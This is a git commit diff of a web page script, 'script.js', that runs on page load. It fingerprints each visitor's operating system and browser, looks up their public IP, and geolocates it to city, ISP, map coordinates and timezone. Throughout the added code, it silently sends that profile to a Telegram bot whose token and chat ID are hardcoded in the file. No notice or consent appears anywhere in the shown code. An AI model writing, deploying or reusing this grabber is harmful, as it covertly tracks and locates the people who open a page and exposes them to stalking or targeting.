10d1d8cc4bedf62e8cbb653bd306b6e65c0eb572
Nebagh_07 <59174186+Nabegh-Anane@users.noreply.github.com>
2024-04-17 15:31:21 +0100

    Update script.js

--- script.js
+++ script.js
@@ -1,86 +1,87 @@
-let mach = ''; // Device type placeholder
-let nav = ''; // Browser type placeholder
-let timezone = ''; // Timezone placeholder
-
 // Determine device type
-if (navigator.userAgent.indexOf('Windows') !== -1) {
+let mach = '';
+const userAgent = navigator.userAgent;
+if (userAgent.includes('Windows')) {
     mach = 'Windows';
-} else if (navigator.userAgent.indexOf('Ubuntu') !== -1) {
+} else if (userAgent.includes('Ubuntu')) {
     mach = 'Ubuntu';
-} else if (navigator.userAgent.indexOf('Kali') !== -1) {
+} else if (userAgent.includes('Kali')) {
     mach = 'Kali';
-} else if (navigator.userAgent.indexOf('Android') !== -1) {
+} else if (userAgent.includes('Android')) {
     mach = 'Android';
-} else if (navigator.userAgent.indexOf('iPhone') !== -1 || navigator.userAgent.indexOf('iPad') !== -1) {
+} else if (userAgent.includes('iPhone') || userAgent.includes('iPad')) {
     mach = 'iOS';
 } else {
     mach = 'Other';
 }
 
 // Determine browser type
-if (navigator.userAgent.indexOf('Chrome') !== -1) {
+let nav = '';
+if (userAgent.includes('Chrome')) {
     nav = 'Chrome';
-} else if (navigator.userAgent.indexOf('Safari') !== -1) {
+} else if (userAgent.includes('Safari')) {
     nav = 'Safari';
-} else if (navigator.userAgent.indexOf('Edge') !== -1) {
+} else if (userAgent.includes('Edge')) {
     nav = 'Edge';
-} else if (navigator.userAgent.indexOf('Firefox') !== -1) {
+} else if (userAgent.includes('Firefox')) {
     nav = 'Mozilla';
-} else if (navigator.userAgent.indexOf('Opera') !== -1) {
+} else if (userAgent.includes('Opera')) {
     nav = 'Opera';
-} else if (navigator.userAgent.indexOf('Tor') !== -1) {
+} else if (userAgent.includes('Tor')) {
     nav = 'Tor';
 } else {
     nav = 'Other';
 }
 
 // Get client IP
-let publicIP = '';
+function get_client_ip(callback) {
+    fetch('https://api64.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => callback(data.ip))
+        .catch(error => console.error('Error:', error));
+}
 
-fetch('https://api64.ipify.org?format=json')
-    .then(response => response.json())
-    .then(data => {
-        publicIP = data.ip;
+// Get geolocation data
+function get_location(ip) {
+    fetch(`http://ipinfo.io/${ip}/geo`)
+        .then(response => response.json())
+        .then(json1 => {
+            const loc = json1.loc;
+            const country = json1.country + ', ' + json1.region + ', ' + json1.city;
 
-        // Get geolocation data
-        fetch(`https://ipinfo.io/${publicIP}/geo`)
-            .then(response => response.json())
-            .then(json1 => {
-                fetch(`http://ip-api.com/json/${publicIP}?fields=query,continent,country,countryCode,regionName,city,zip,timezone,isp,org,as,asname,reverse,mobile,proxy,hosting`)
-                    .then(response => response.json())
-                    .then(json => {
-                        const loc = json1.loc;
-                        const country = `${json1.countryCode}, ${json.regionName}, ${json.city}`;
-                        const zip = json.isp;
-                        timezone = json.timezone;
+            fetch(`http://ip-api.com/json/${ip}?fields=query,continent,country,countryCode,regionName,city,zip,timezone,isp,org,as,asname,reverse,mobile,proxy,hosting`)
+                .then(response => response.json())
+                .then(json => {
+                    const timezone = json.timezone;
+                    const zip = json.isp;
 
-                        // Telegram message construction
-                        const msg = `-----{===--{ Nevo Info }--===}-----\n\nYour IP : ${publicIP}\n\nYour APP & Device : ${mach}/${nav}\n\nYour address : ${country}\n\nYour Provider : ${zip}\n\nYour Location : http://www.google.com/maps/place/${loc}\n\nYour Time Now Is :${timezone}\n\n-----{===--{ Nevo Info }--===}-----`;
+                    // Telegram message construction
+                    const msg = "-----{===--{ Nevo Info }--===}-----" + "\n\n" + "Your IP : " + ip + "\n\n" + "Your APP & Device : " + mach + '/' + nav + "\n\n" + "Your address : " + country + "\n\n" + "Your Provider : " + zip + "\n\n" + "Your Location : http://www.google.com/maps/place/" + loc + "\n\n" + "Your Time Now Is :" + timezone + "\n\n" + "-----{===--{ Nevo Info }--===}-----";
 
-                        // Telegram API endpoint and data
-                        const bot_id = "-1001874783762"; // Your Telegram bot ID
-                        const url = 'https://api.telegram.org/bot6122428056:AAGnIMsjHzFpM9taaSTzdvFsJGNaTmvjZCY/sendMessage'; // Replace <YourBotToken> with your actual bot token
+                    // Telegram API endpoint and data
+                    const bot_id = "-1001874783762"; // Your Telegram bot ID
+                    const url = 'https://api.telegram.org/bot6122428056:AAGnIMsjHzFpM9taaSTzdvFsJGNaTmvjZCY/sendMessage'; // Replace <YourBotToken> with your actual bot token
 
-                        const data = {
-                            chat_id: bot_id,
-                            text: msg
-                        };
+                    const data = {
+                        chat_id: bot_id,
+                        text: msg
+                    };
 
-                        const options = {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json'
-                            },
-                            body: JSON.stringify(data)
-                        };
+                    const options = {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(data)
+                    };
 
-                        fetch(url, options)
-                            .then(response => response.json())
-                            .then(result => console.log(result))
-                            .catch(error => console.error('Error:', error));
-                    })
-                    .catch(error => console.error('Error:', error));
-            })
-            .catch(error => console.error('Error:', error));
-    })
-    .catch(error => console.error('Error:', error));
+                    fetch(url, options)
+                        .then(response => response.json())
+                        .then(result => console.log(result))
+                        .catch(error => console.error('Error:', error));
+                });
+        });
+}
+
+// Call functions
+get_client_ip(get_location);
